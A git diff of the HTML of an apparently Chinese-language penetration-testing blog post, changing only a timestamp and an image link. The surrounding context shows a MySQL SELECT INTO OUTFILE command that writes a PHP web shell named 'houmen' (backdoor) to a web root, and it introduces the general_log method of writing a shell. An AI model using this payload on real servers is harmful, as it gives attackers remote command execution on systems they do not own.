@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://artibix.github.io/img/cover_reverse_shell.jpg">
 <meta property="article:published_time" content="2021-04-28T14:23:26.000Z">
-<meta property="article:modified_time" content="2024-10-12T03:02:31.423Z">
+<meta property="article:modified_time" content="2024-10-14T00:51:12.027Z">
 <meta property="article:author" content="Artibix">
 <meta property="article:tag" content="nc">
 <meta property="article:tag" content="渗透">
@@ -332,7 +332,7 @@
 <figure><div class="code-wrapper"><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @system ($_GET ['cmd']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/srv/http/houmen.php'</span><span class="token punctuation">;</span></code></pre></div></figure>
 
 <p>接下来就可以利用这个文件为所欲为啦</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/yangchaohe.github.io@static//img/article/2021/webshell.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yangchaohe/img/article/2021/webshell.png" srcset="/img/loading.gif" lazyload></p>
 <h3 id="利用-general-log"><a href="#利用-general-log" class="headerlink" title="利用 general_log"></a>利用 general_log</h3><p>如果上面的 <code>secure_file_priv</code> 规定了输出目录或者是 NULL，还可以使用 <code>general_log</code> 的方法来写 shell，它记录所有基础日志，默认关闭状态。</p>
 <ol>
 <li>模糊查找关于 general 的信息</li>
